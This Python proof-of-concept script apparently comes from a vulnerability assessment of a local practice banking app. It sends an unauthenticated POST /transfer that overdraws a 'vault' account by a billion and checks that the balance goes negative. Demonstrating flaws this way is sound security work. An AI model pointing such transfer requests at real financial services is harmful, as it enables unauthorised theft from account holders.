#!/usr/bin/env python3
"""PoC (proven-live step, F-2): unbounded theft - overdraw far past balance.

Stronger than poc1_transfer_unauth.py: proves not only that a zero-credential
transfer mutates state, but that the amount is UNBOUNDED - the vault is driven
far below zero (no sufficient-balance check), i.e. theft is not capped by the
funds that actually exist.
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = reproduced.
"""
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"


def transfer(src: str, dst: str, amount: int) -> dict:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read().decode())


def balances() -> dict:
    return transfer("vault", "vault", 0)["balances"]  # no-op probe, returns state


def main() -> int:
    before = balances()
    print(f"[read   ] balances before: {before}")

    resp = transfer("vault", "bob", 1_000_000_000)
    print(f"[attack ] POST /transfer from=vault to=bob amount=1000000000 -> {resp}")

    after = balances()
    print(f"[read   ] balances after : {after}")

    ok = after["vault"] < 0 and after["vault"] <= before["vault"] - 1_000_000_000
    if not ok:
        print("FAIL: overdraw not observed (a balance check would have rejected this)")
        return 1
    print(
        "REPRODUCED: vault driven to "
        f"{after['vault']} (negative) by one unauthenticated request - "
        "no sufficient-balance check, theft is unbounded"
    )
    print("--- transcript (attack response) ---")
    print(json.dumps(resp, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
